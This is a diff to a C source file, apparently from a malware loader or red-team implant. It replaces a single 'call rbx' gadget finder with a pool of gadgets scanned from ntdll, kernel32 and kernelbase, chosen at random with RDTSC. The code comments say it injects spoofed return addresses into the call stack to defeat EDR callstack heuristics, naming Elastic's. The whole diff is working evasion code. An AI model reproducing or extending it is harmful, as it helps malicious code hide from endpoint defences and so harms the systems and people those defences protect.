@@ -7,42 +7,76 @@
 #include "Common.h"
 
 // -----------------------------------------------
-// FindCallGadget - scan a module's executable
-// sections for a 'call rbx' (FF D3) gadget.
+// Call Gadget Pool — `call rbx` (FF D3) sites
+// harvested from multiple signed system DLLs.
 //
-// Used by call stack spoofing to inject a frame
-// from a legitimate signed DLL into the call stack.
+// SpoofCallback picks one per-run via RDTSC so the
+// return address injected into the call stack is not
+// the same bytes of ntdll every execution; this
+// defeats EDR rules that flag "single return-address
+// frequency" (Elastic 8.11+ callstack heuristics).
+//
+// Register is still rbx only — SpoofCallback's asm
+// stub is hard-wired to `mov rbx, target; jmp gadget`.
 // -----------------------------------------------
-PVOID FindCallGadget(IN PVOID pModuleBase) {
+#define MAX_CALL_GADGETS 64
+static struct {
+    PVOID   pGadgets[MAX_CALL_GADGETS];
+    DWORD   dwCount;
+} g_CallGadgetPool = { 0 };
+
+// Scan one module's executable sections for `call rbx`
+// (FF D3) and append hits to the global pool.
+static VOID ScanModuleForCallRbx(IN PVOID pModuleBase) {
 
     if (!pModuleBase)
-        return NULL;
+        return;
 
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
-        return NULL;
+        return;
 
     PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pDos->e_lfanew);
     if (pNt->Signature != IMAGE_NT_SIGNATURE)
-        return NULL;
+        return;
 
     PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
-    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (!(pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
+    for (WORD s = 0; s < pNt->FileHeader.NumberOfSections && g_CallGadgetPool.dwCount < MAX_CALL_GADGETS; s++) {
+        if (!(pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
             continue;
 
-        PBYTE pStart = (PBYTE)pModuleBase + pSec[i].VirtualAddress;
-        DWORD dwSize = pSec[i].Misc.VirtualSize;
+        PBYTE pStart = (PBYTE)pModuleBase + pSec[s].VirtualAddress;
+        DWORD dwSize = pSec[s].Misc.VirtualSize;
 
-        for (DWORD j = 0; j + 1 < dwSize; j++) {
-            // FF D3 = call rbx
+        for (DWORD j = 0; j + 1 < dwSize && g_CallGadgetPool.dwCount < MAX_CALL_GADGETS; j++) {
             if (pStart[j] == 0xFF && pStart[j + 1] == 0xD3) {
-                return (PVOID)(pStart + j);
+                g_CallGadgetPool.pGadgets[g_CallGadgetPool.dwCount++] = (PVOID)(pStart + j);
             }
         }
     }
+}
 
-    return NULL;
+// Populate the pool from ntdll / kernel32 / kernelbase.
+// All three are loaded in every x64 Windows process;
+// additional modules could be added but returns diminish
+// since the cap is 64 and ntdll alone usually saturates.
+BOOL CollectCallGadgets(VOID) {
+
+    g_CallGadgetPool.dwCount = 0;
+    ScanModuleForCallRbx(FindLoadedModuleW(L"NTDLL.DLL"));
+    ScanModuleForCallRbx(FindLoadedModuleW(L"KERNEL32.DLL"));
+    ScanModuleForCallRbx(FindLoadedModuleW(L"KERNELBASE.DLL"));
+    return g_CallGadgetPool.dwCount > 0;
+}
+
+// RDTSC-seeded random pick. Returns NULL if the pool is
+// empty; SpoofCallback falls back to a direct tail-call.
+PVOID GetRandomCallGadget(VOID) {
+
+    if (g_CallGadgetPool.dwCount == 0)
+        return NULL;
+    DWORD idx = (DWORD)(__rdtsc() % g_CallGadgetPool.dwCount);
+    return g_CallGadgetPool.pGadgets[idx];
 }
 
 // -----------------------------------------------
